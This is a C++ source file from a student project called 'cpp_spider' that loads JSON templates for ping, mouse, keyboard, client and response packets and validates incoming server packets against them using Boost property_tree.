/*
** Parser.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/server/src/parser/Parser.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 19:43:36 2017 Gauthier Cler
** Last update Sun Oct 08 19:43:36 2017 Gauthier Cler
*/

#include <boost/foreach.hpp>
#include <iostream>
#include <boost/property_tree/json_parser.hpp>
#include "Parser.hpp"
#include "Error.hpp"

Spider::Parser::Parser() {
  boost::property_tree::ptree ping;
  boost::property_tree::ptree mouse;
  boost::property_tree::ptree keyboard;
  boost::property_tree::ptree client;
  boost::property_tree::ptree commandResponse;

  try {
    boost::property_tree::read_json("server/Templates/ping.json", ping);
    boost::property_tree::read_json("server/Templates/mouse.json", mouse);
    boost::property_tree::read_json("server/Templates/keyboard.json", keyboard);
    boost::property_tree::read_json("server/Templates/client.json", client);
    boost::property_tree::read_json("server/Templates/response.json", commandResponse);
    this->_templates[EnumParser::PING] = ping;
    this->_templates[EnumParser::MOUSE] = mouse;
    this->_templates[EnumParser::KEYBOARD] = keyboard;
    this->_templates[EnumParser::CLIENT] = client;
    this->_templates[EnumParser::COMMAND_RESPONSE] = commandResponse;
  } catch (std::exception &e) {
    throw ParserError("Can't load templates parser files");
  }
}

Spider::EnumParser Spider::Parser::run(const std::string &packet) {
  boost::property_tree::ptree packetree;
  std::stringstream stream;

  std::cout << "got => " << std::endl;
  std::cout << packet << std::endl;
  try {
    stream << packet;
    boost::property_tree::read_json(stream, packetree);
    for (auto &templa : this->_templates) {
      if (this->validation(templa.second, packetree))
	return templa.first;
    }
  } catch (std::exception &e) {
//    std::cout << e.what() << std::endl;
    return EnumParser::ERROR;
  }

  return EnumParser::OTHER;
}

bool Spider::Parser::validation(boost::property_tree::ptree &validation,
				boost::property_tree::ptree &values) {
  if (validation.size() != values.size())
    return false;
  BOOST_FOREACH(boost::property_tree::ptree::value_type &item, values)
  {
    try {
      auto value = validation.get_child(item.first);
      if (!value.empty() && !this->validation(value, item.second))
	return false;
    } catch (std::exception &e) {
      return false;
    }
  }
  return true;
}

